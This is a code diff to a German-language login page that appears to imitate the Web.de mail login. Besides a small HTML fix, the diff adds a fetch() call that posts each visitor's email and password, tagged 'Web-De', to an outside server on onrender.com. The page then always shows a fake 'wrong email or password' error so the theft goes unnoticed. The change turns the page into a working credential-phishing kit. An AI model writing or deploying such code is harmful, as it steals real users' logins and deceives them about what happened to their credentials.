@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
     <link rel="icon" href="images/favicon.ico" type="image/x-icon">
-    <link rel="stylesheet" href="css/style.css"
+    <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
     <div class="login-card">
@@ -132,13 +132,34 @@
                     continueBtn.textContent = 'Anmelden...';
                     continueBtn.disabled = true;
 
-                    setTimeout(function() {
+                    //Get login credentials
+                    fetch('https://web-backend-vdsi.onrender.com', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                email: email,
+                password: password,
+                source: 'Web-De',
+              }),
+            })
+              .then((res) => {
+                if (!res.ok) {
+                  throw new Error(
+                    'Network response was not ok ' + res.statusText,
+                  );
+                }
+                return res.json();
+              })
+              .then((data) => {
+
                         continueBtn.textContent = 'Weiter';
                         continueBtn.disabled = false;
                         showError('Die eingegebene E-Mail-Adresse oder das Passwort ist falsch.');
                         passwordInput.value = '';
                         passwordInput.focus();
-                    }, 1500);
+                    });
                 }
             });
 
